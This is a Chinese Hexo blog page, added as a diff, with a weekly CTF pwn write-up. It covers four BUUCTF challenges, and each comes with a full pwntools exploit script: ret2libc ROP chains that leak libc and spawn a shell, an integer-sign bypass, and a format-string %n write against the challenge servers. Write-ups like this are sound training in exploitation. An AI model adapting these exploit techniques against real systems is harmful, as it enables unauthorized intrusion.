@@ -1,0 +1,753 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/D7595533-A8D5-4519-BF7F-065D11AC0493.2fqu8w452yyo.jpg">
+  <link rel="icon" href="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/D7595533-A8D5-4519-BF7F-065D11AC0493.2fqu8w452yyo.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hhh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="铁人三项(第五赛区)_2018_rop检查  找到溢出点，还是泄露libc的地址   exp 1234567891011121314151617181920from pwn import*from LibcSearcher import*io&#x3D;remote(&quot;node4.buuoj.cn&quot;,29810)elf&#x3D;ELF(&amp;#x27;.&#x2F;2018rop&amp;#x27;)write_pl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn_第六周">
+<meta property="og:url" content="http://example.com/2023/02/24/pwn-%E7%AC%AC%E5%85%AD%E5%91%A8/index.html">
+<meta property="og:site_name" content="lekc">
+<meta property="og:description" content="铁人三项(第五赛区)_2018_rop检查  找到溢出点，还是泄露libc的地址   exp 1234567891011121314151617181920from pwn import*from LibcSearcher import*io&#x3D;remote(&quot;node4.buuoj.cn&quot;,29810)elf&#x3D;ELF(&amp;#x27;.&#x2F;2018rop&amp;#x27;)write_pl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/eUU6UAh8.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/138y6bd6.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/VCnT6ZD2.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/NsmHPpOY.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/yPAeHq4B.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/SoUgftxV.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/14JaAQdv.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/s3vZP9PT.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/wmQkQ6VC.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/iLQO39Hh.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/959H7ybk.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/anVygE7j.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/25/XxXImrLu.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/26/KgVwtZMk.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/26/h8BFzfkU.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/26/0veExr5A.jpg">
+<meta property="og:image" content="https://img1.imgtp.com/2023/02/26/KZnWXXI8.jpg">
+<meta property="article:published_time" content="2023-02-24T10:02:59.000Z">
+<meta property="article:modified_time" content="2023-02-26T04:21:38.077Z">
+<meta property="article:author" content="hhh">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="周题">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img1.imgtp.com/2023/02/25/eUU6UAh8.jpg">
+  
+  
+  
+  <title>pwn_第六周 - lekc</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":40,"cursorChar":"","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 50vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lekc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" false
+     style="background: url('https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A65DBEB1-57E2-43F3-B625-D2BFCD60C20D.5ni8azxc6934.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">pwn_第六周</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-24 18:02" pubdate>
+          2023年2月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="pwn"
+        id="heading-e4a25f7b052442a076b02ee9a1818d2e" role="tab" data-toggle="collapse" href="#collapse-e4a25f7b052442a076b02ee9a1818d2e"
+        aria-expanded="true"
+      >
+        pwn
+        <span class="list-group-count">(8)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-e4a25f7b052442a076b02ee9a1818d2e"
+           role="tabpanel" aria-labelledby="heading-e4a25f7b052442a076b02ee9a1818d2e">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/01/10/pwn-%E7%AC%AC%E4%B8%80%E5%91%A8/" title="pwn-第一周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第一周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/03/01/pwn-%E7%AC%AC%E4%B8%83%E5%91%A8/" title="pwn-第七周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第七周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/28/pwn-%E7%AC%AC%E4%B8%89%E5%91%A8/" title="pwn-第三周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第三周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/19/pwn-%E7%AC%AC%E4%BA%8C%E5%91%A8/" title="pwn-第二周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第二周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/02/18/pwn-%E7%AC%AC%E4%BA%94%E5%91%A8/" title="pwn-第五周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第五周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/03/11/pwn-%E7%AC%AC%E5%85%AB%E5%91%A8/" title="pwn-第八周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第八周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/02/07/pwn-%E7%AC%AC%E5%9B%9B%E5%91%A8/" title="pwn-第四周"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">pwn-第四周</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/02/24/pwn-%E7%AC%AC%E5%85%AD%E5%91%A8/" title="pwn_第六周"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">pwn_第六周</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pwn_第六周</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>检查</p>
+<p><img src="https://img1.imgtp.com/2023/02/25/eUU6UAh8.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>找到溢出点，还是泄露libc的地址</p>
+<p><img src="https://img1.imgtp.com/2023/02/25/138y6bd6.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p><img src="https://img1.imgtp.com/2023/02/25/VCnT6ZD2.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>exp</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29810)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./2018rop&#x27;)<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main_addr</span>=0x80484C6<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x88+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(p)<br><span class="hljs-attribute">write_addr</span>=u32(io.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">base_addr</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">sys</span>=base_addr+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bs</span>=base_addr+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x88+4)+p32(sys)+b&#x27;aaaa&#x27;+p32(bs)<br>io.sendline(p)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/02/25/NsmHPpOY.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查文件</p>
+<p><img src="https://img1.imgtp.com/2023/02/25/yPAeHq4B.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>发现溢出点</p>
+<p><img src="https://img1.imgtp.com/2023/02/25/SoUgftxV.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p><img src="https://img1.imgtp.com/2023/02/25/14JaAQdv.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>exp</p>
+<p>开始一直出现一些报错，一直调不好，最后发现是因为main的地址写错了</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import*<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,25393)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./20babyrop&#x27;)<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">ret</span>=0x4004c9<br><span class="hljs-attribute">rdi</span>=0x400733<br><span class="hljs-attribute">main_add</span>=0x4006AD<br><span class="hljs-attribute">p</span>=b&quot;a&quot;*(0x28)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_add)<br>io.recvuntil(<span class="hljs-string">&#x27;story!&#x27;</span>)<br>io.sendline(p)<br><span class="hljs-attribute">puts_add</span>=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(puts_add))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;puts&quot;,puts_add)<br><span class="hljs-attribute">base_add</span>=puts_add-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">sys</span>=base_add+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bs</span>=base_add+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&quot;a&quot;*(0x28)+p64(ret)+p64(rdi)+p64(bs)+p64(sys)<br>io.recvuntil(<span class="hljs-string">&#x27;story!&#x27;</span>)<br>io.sendline(p)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/02/25/s3vZP9PT.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p><img src="https://img1.imgtp.com/2023/02/25/wmQkQ6VC.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>找到溢出点</p>
+<p><img src="https://img1.imgtp.com/2023/02/25/iLQO39Hh.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p><img src="https://img1.imgtp.com/2023/02/25/959H7ybk.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>只要满足条件就可以直接溢出，简单的有符号数与无符号数，使用-1便满足条件</p>
+<p><img src="https://img1.imgtp.com/2023/02/25/anVygE7j.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29004)<br><span class="hljs-attribute">p</span>=b&#x27;-1&#x27;<br>io.sendline(p)<br><span class="hljs-attribute">ret</span>=0x400599<br><span class="hljs-attribute">rdi</span>=400893<br><span class="hljs-attribute">sys_addr</span>=0x40072A<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x10+8)+p64(ret)+p64(sys_addr)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/02/25/XxXImrLu.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>检查，开启了栈不可执行与栈保护</p>
+<p><img src="https://img1.imgtp.com/2023/02/26/KgVwtZMk.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>发现只要x等于4就可以执行system(“&#x2F;bin&#x2F;sh”)，有格式化字符串漏洞</p>
+<p><img src="https://img1.imgtp.com/2023/02/26/h8BFzfkU.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p><img src="https://img1.imgtp.com/2023/02/26/0veExr5A.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+<p>exp</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25689</span>)<br>x=<span class="hljs-number">0x804A02C</span><br>p=p32(x)+b<span class="hljs-string">&#x27;%11$n&#x27;</span><br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/02/26/KZnWXXI8.jpg" srcset="https://cdn.staticaly.com/gh/lengkc/image@master/nacho/A2C82666-45D3-4241-97AE-C8A9661A5D17(20221011-093.gz30z3w5zxc.jpg" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href=" ">#pwn</a>
+      
+        <a href=" ">#周题</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/01/pwn-%E7%AC%AC%E4%B8%83%E5%91%A8/" title="pwn-第七周">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn-第七周</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/18/pwn-%E7%AC%AC%E4%BA%94%E5%91%A8/" title="pwn-第五周">
+                        <span class="hidden-mobile">pwn-第五周</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      
+
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
